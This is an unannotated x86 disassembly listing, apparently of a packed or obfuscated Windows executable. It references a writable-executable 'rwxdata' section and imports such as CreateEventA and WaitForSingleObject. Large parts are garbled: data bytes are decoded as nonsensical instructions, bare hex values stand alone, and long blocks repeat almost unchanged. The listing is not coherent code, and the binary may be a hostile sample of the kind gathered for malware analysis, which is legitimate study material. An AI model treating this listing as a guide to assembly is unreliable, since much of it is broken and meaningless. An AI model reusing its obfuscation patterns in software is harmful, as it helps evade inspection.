imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
call sub_5149d2
pushad
push 0xb92e92d3
dec bl
mov bl 0x2
inc al
dec al
push [ esp + 0x18 ]
inc ecx
setg al
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
mov al 0x10
lea esp [ esp + 0x28 ]
js rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
pushfd
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
pushfd
mov [ esp ] 0x229db0e4
lea esp [ esp + 0x24 ]
call sub_514aff
push 0xbed9ed2d
mov [ esp ] ch
adc al al
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
push esp
jmp rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jmp rwxdata
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
jmp rwxdata
call sub_515ff7
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
je rwxdata
jns rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
pop ds
add [ eax ] al
jo rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
sub_515979
push edi
call sub_516afc
add [ eax ] al
push esp
push 0x64616572
xor esi [ edx ]
dec esi
js __import_name_6(MSVCRT:_iob)
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
add [ eax - 0x17 ] ah
mov ecx 0xe800000c

sub_515994
call sub_514e64
stc
push [ esp + 0x4 ]
mov [ esp + 0xc ] 0x37
sub esi eax
pushfd
push edx
[ edi ] [ esi ]
not si
mov esi [ esp + 0x1c ]
mov [ esp + 0x4 ] ebp
push 0xc3dbf82b
mov [ esp ] 0xcd
pushfd
lea esp [ esp + 0x28 ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
